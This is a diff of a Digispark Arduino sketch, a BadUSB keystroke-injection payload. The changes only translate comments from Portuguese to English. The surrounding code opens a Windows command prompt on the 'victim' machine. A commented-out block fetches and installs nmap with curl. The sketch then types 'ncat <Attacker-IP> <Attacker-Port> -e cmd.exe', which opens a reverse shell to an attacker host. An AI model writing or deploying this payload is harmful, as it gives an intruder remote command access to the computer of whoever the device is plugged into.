@@ -6,13 +6,13 @@
 void setup() {
   DigiKeyboard.delay(500); 
   DigiKeyboard.sendKeyStroke(0); 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // tecla Win + R 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // key Win + R 
   DigiKeyboard.delay(1000); 
-  DigiKeyboard.println("cmd"); // Digita "cmd"
+  DigiKeyboard.println("cmd"); // Type "cmd"
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(2000); 
   
-  // DESCOMENTE CASO A VITIMA NÃO TENHA O NMAP INSTALADO || UNCOMMENT IF THE VICTIM HASN'T NMAP INSTALLED
+  // UNCOMMENT IF THE VICTIM HASN'T NMAP INSTALLED
   /*DigiKeyboard.print("curl -O https://nmap.org/dist/nmap-7.95-setup.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(19000);
@@ -42,9 +42,9 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // tecla Win + R 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // key Win + R 
   DigiKeyboard.delay(1000); 
-  DigiKeyboard.println("cmd"); // Digita "cmd"
+  DigiKeyboard.println("cmd"); // Type "cmd"
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(2000); */ 
   DigiKeyboard.print("ncat <Attacker-IP> <Attacker-Port> -e cmd.exe");
